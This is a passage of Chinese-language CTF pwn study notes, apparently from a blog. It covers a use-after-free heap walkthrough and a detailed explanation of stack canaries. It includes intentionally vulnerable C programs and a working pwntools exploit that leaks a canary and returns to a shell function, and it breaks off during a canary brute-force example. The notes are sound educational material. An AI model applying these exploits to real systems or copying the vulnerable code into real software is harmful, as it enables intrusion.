class="line">0x8a6f008 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 337,    fd = 0x0,    bk = 0x0,    fd_nextsize = 0x0,    bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f158 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 17,    fd = 0x80485fb &lt;print_note_content&gt;,    bk = 0x8a6f170,    fd_nextsize = 0x0,    bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f168 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 33,    fd = 0x61616161,    bk = 0xa,    fd_nextsize = 0x0,    bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f188 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 17,    fd = 0x80485fb &lt;print_note_content&gt;,    bk = 0x8a6f1a0,    fd_nextsize = 0x0,    bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f198 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 33,    fd = 0x62626262,    bk = 0xa,    fd_nextsize = 0x0,    bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f1b8 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0,    mchunk_size = 138825,    fd = 0x0,    bk = 0x0,    fd_nextsize = 0x0,    bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>free note0</p></li><li><p>free note1</p></li><li><p>此时, 在<code>Tcachebins</code>中链表为<code>note1 -&gt; note0</code></p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x10 [  2]: 0x8a6f190 —▸ 0x8a6f160 ◂— 0x0</span><br><span class="line">0x18 [  2]: 0x8a6f1a0 —▸ 0x8a6f170 ◂— 0x0</span><br></pre></td></tr></table></figure><ul><li>申请note2, content size  为8, 那么根据堆分配规则, 其实note2会分配到note1对应的内存块, 而<code>content</code>就是对应<code>note0</code></li></ul><p>此时的堆结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x8a6f008 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 337,  fd = 0x200,  bk = 0x0,  fd_nextsize = 0x0,  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f158 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 17,  fd = 0x8048945 &lt;magic&gt;,  bk = 0x8a6f10a,  fd_nextsize = 0x0,  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f168 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 33,  fd = 0x0,  bk = 0xa,  fd_nextsize = 0x0,  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f188 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 17,  fd = 0x80485fb &lt;print_note_content&gt;,  bk = 0x8a6f160,  fd_nextsize = 0x0,  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f198 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 33,  fd = 0x8a6f170,  bk = 0xa,  fd_nextsize = 0x0,  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x8a6f1b8 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0,  mchunk_size = 138825,  fd = 0x0,  bk = 0x0,  fd_nextsize = 0x0,  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这时我们向<code>real content</code>的chunk部分写入<code>magic</code>函数的地址, 由于没有把note0的指针置为NULL, 那么我们再次输出note0时, 就会调用magic函数, 从而getshell</li></ul><h3 id="Defcon-ctf-quals-2014-shitsco"><a href="#Defcon-ctf-quals-2014-shitsco" class="headerlink" title="Defcon-ctf-quals-2014-shitsco"></a>Defcon-ctf-quals-2014-shitsco</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1iE411H7cZ">跟着B站学 fist_fit 和 UAF</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/">CTF Wiki</a></p><p><a href="https://blog.csdn.net/prettyX/article/details/103247842">CTF PWN选手的养成</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canary</title>
      <link href="/note-pwn-canary/"/>
      <url>/note-pwn-canary/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>由于自己的懒惰, 一直没有认真学习pwn。总是学了忘…..所以从头开始, 认真记录学习过程</li><li>主要跟着<a href="https://ctf-wiki.github.io/ctf-wiki/">CTF Wiki</a>进行学习</li><li>当然还要敬鑫大佬的帮忙！</li></ul><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>原文:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">Canary</a></p><ul><li>基本是抄的, 略有增删</li></ul><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><p>Canary 的意思是金丝雀, 来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒, 金丝雀由于对毒性敏感就会停止鸣叫甚至死亡, 从而使工人们得到预警。</p><p>Canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h4><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护, 不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护, 为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 对包含有malloc族系或者内部的buffer大于8字节的或者包含局部数组的或者包含对<span class="built_in">local</span> frame地址引用的函数使能canary.</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>开启 Canary 保护的 stack 结构大概如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> High   Address |                 |</span><br><span class="line">                +-----------------+</span><br><span class="line">                | args            |</span><br><span class="line">                +-----------------+</span><br><span class="line">                | return address  |</span><br><span class="line">                +-----------------+</span><br><span class="line">        rbp =&gt;  | old ebp         |</span><br><span class="line">                +-----------------+</span><br><span class="line">      rbp-8 =&gt;  | canary value    |</span><br><span class="line">                +-----------------+</span><br><span class="line">                | 局部变量          |</span><br><span class="line">Low      Address|                 |</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后, 在函数序言部分会取 fs 寄存器 0x28 处的值, 存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值, 代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前, 会将该值取出, 并与 fs:0x28 的值进行异或。如果异或的结果为 0, 说明 Canary 未被修改, 函数会正常返回, 这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rdx, QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx, QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改, 此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数, 默认情况下经过 ELF 的延迟绑定, 定义如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步, 对于 Linux 来说, fs 寄存器实际指向的是当前栈的 TLS 结构, fs:0x28 指向的正是 stack_guard。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上, TLS 中的值由函数 <code>security_init</code> 进行初始化。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>这里我们编写一个程序进行直观的认识</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  canary gcc --version</span><br><span class="line">gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// canary.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    foo(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用Canary, foo函数汇编代码:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc canary.c -o canary -fno-stack-protector</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000068A                 public foo</span><br><span class="line">.text:000000000000068A foo             proc near               ; CODE XREF: main+B↓p</span><br><span class="line">.text:000000000000068A</span><br><span class="line">.text:000000000000068A src             = qword ptr -108h</span><br><span class="line">.text:000000000000068A dest            = byte ptr -100h</span><br><span class="line">.text:000000000000068A</span><br><span class="line">.text:000000000000068A ; __unwind &#123;</span><br><span class="line">.text:000000000000068A                 push    rbp</span><br><span class="line">.text:000000000000068B                 mov     rbp, rsp</span><br><span class="line">.text:000000000000068E                 sub     rsp, 110h</span><br><span class="line">.text:0000000000000695                 mov     [rbp+src], rdi</span><br><span class="line">.text:000000000000069C                 mov     rdx, [rbp+src]</span><br><span class="line">.text:00000000000006A3                 lea     rax, [rbp+dest]</span><br><span class="line">.text:00000000000006AA                 mov     rsi, rdx        ; src</span><br><span class="line">.text:00000000000006AD                 mov     rdi, rax        ; dest</span><br><span class="line">.text:00000000000006B0                 call    _strcpy</span><br><span class="line">.text:00000000000006B5                 lea     rax, [rbp+dest]</span><br><span class="line">.text:00000000000006BC                 mov     rsi, rax</span><br><span class="line">.text:00000000000006BF                 lea     rdi, format     ; &quot;%s&quot;</span><br><span class="line">.text:00000000000006C6                 mov     eax, 0</span><br><span class="line">.text:00000000000006CB                 call    _printf</span><br><span class="line">.text:00000000000006D0                 nop</span><br><span class="line">.text:00000000000006D1                 leave</span><br><span class="line">.text:00000000000006D2                 retn</span><br><span class="line">.text:00000000000006D2 ; &#125; // starts at 68A</span><br><span class="line">.text:00000000000006D2 foo             endp</span><br></pre></td></tr></table></figure><p>打开Canary保护, foo函数汇编代码:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc canary.c -o canary -fstack-protector-all</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000006FA                 public foo</span><br><span class="line">.text:00000000000006FA foo             proc near               ; CODE XREF: main+1E↓p</span><br><span class="line">.text:00000000000006FA</span><br><span class="line">.text:00000000000006FA src             = qword ptr -118h</span><br><span class="line">.text:00000000000006FA dest            = byte ptr -110h</span><br><span class="line">.text:00000000000006FA var_8           = qword ptr -8</span><br><span class="line">.text:00000000000006FA</span><br><span class="line">.text:00000000000006FA ; __unwind &#123;</span><br><span class="line">.text:00000000000006FA                 push    rbp</span><br><span class="line">.text:00000000000006FB                 mov     rbp, rsp</span><br><span class="line">.text:00000000000006FE                 sub     rsp, 120h</span><br><span class="line">.text:0000000000000705                 mov     [rbp+src], rdi</span><br><span class="line">.text:000000000000070C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000000715                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000000719                 xor     eax, eax</span><br><span class="line">.text:000000000000071B                 mov     rdx, [rbp+src]</span><br><span class="line">.text:0000000000000722                 lea     rax, [rbp+dest]</span><br><span class="line">.text:0000000000000729                 mov     rsi, rdx        ; src</span><br><span class="line">.text:000000000000072C                 mov     rdi, rax        ; dest</span><br><span class="line">.text:000000000000072F                 call    _strcpy</span><br><span class="line">.text:0000000000000734                 lea     rax, [rbp+dest]</span><br><span class="line">.text:000000000000073B                 mov     rsi, rax</span><br><span class="line">.text:000000000000073E                 lea     rdi, format     ; &quot;%s&quot;</span><br><span class="line">.text:0000000000000745                 mov     eax, 0</span><br><span class="line">.text:000000000000074A                 call    _printf</span><br><span class="line">.text:000000000000074F                 nop</span><br><span class="line">.text:0000000000000750                 mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000000754                 xor     rax, fs:28h</span><br><span class="line">.text:000000000000075D                 jz      short locret_764</span><br><span class="line">.text:000000000000075F                 call    ___stack_chk_fail</span><br><span class="line">.text:0000000000000764 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000764</span><br><span class="line">.text:0000000000000764 locret_764:                             ; CODE XREF: foo+63↑j</span><br><span class="line">.text:0000000000000764                 leave</span><br><span class="line">.text:0000000000000765                 retn</span><br><span class="line">.text:0000000000000765 ; &#125; // starts at 6FA</span><br><span class="line">.text:0000000000000765 foo             endp</span><br></pre></td></tr></table></figure><p>两者对比很明显看到, 打开canary保护后, 程序中插入了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line">......</span><br><span class="line">mov     rax, [rbp+var_8]</span><br><span class="line">xor     rax, fs:28h</span><br><span class="line">jz      short locret_764</span><br><span class="line">call    ___stack_chk_fail</span><br></pre></td></tr></table></figure><h3 id="编译参数"><a href="#编译参数" class="headerlink" title="编译参数"></a>编译参数</h3><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能, 4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度, 例如:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                          // 默认情况下, 不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c     //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c        //启用堆栈保护, 不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c    //启用堆栈保护, 为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h3 id="绕过技术"><a href="#绕过技术" class="headerlink" title="绕过技术"></a>绕过技术</h3><h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用, 在这里给出了常见的存在 Canary 的栈溢出利用思路, 请注意每种方法都有特定的环境要求。</p><h4 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h4><p>Canary 设计为以字节 <code>\x00</code> 结尾, 本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节, 来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数, 并且可能需要第一溢出泄露 Canary, 之后再次溢出控制执行流程。</p><h5 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h5><p>存在漏洞的示例源代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ex2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序, 开启 NX, Canary , 关闭 ALSR保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -no-pie -o ex2 ex2.c</span><br></pre></td></tr></table></figure><p>checksec一下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work checksec ex2</span><br><span class="line">[*] <span class="string">&#x27;/home/lantern/Desktop/work/ex2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后, 计算好偏移, 将 Canary 填入到相应的溢出位置, 实现 Ret 到 getshell 函数中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/zsh python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ex2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ex2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = p.recvuntil</span><br><span class="line"></span><br><span class="line">sl = p.sendline</span><br><span class="line"></span><br><span class="line">get_shell = ELF(<span class="string">&quot;./ex2&quot;</span>).sym[<span class="string">&quot;getshell&quot;</span>]</span><br><span class="line">ru(<span class="string">&quot;Hello Hacker!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;A&quot;</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line">log.info(<span class="string">&quot;Canary:&quot;</span> + <span class="built_in">hex</span>(Canary))</span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span>*<span class="number">100</span>+p32(Canary)+<span class="string">b&quot;\x90&quot;</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work python3 exp2.py</span><br><span class="line">[*] <span class="string">&#x27;/home/lantern/Desktop/work/ex2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ex2&#x27;</span>: pid 61114</span><br><span class="line">[*] Canary:0xdeaff300</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90$</span><br></pre></td></tr></table></figure><p>成功<code>getshell</code>！</p><h4 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h4><p>对于 Canary, 虽然每次进程重启后的 Canary 不同 (相比 GS, GS 重启后是相同的), 但是同一个进程中的不同线程的 Canary 是相同的, 并且 通过 fork 函数创建的子进程的 Canary 也是相同的, 因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点, 彻底逐个字节将 Canary 爆破出来。</p><h5 id="利用示例-1"><a href="#利用示例-1" class="headerlink" title="利用示例"></a>利用示例</h5><p>漏洞代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ex3.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>( <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> ( pid ) &#123;</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">            vuln();</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;recv success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 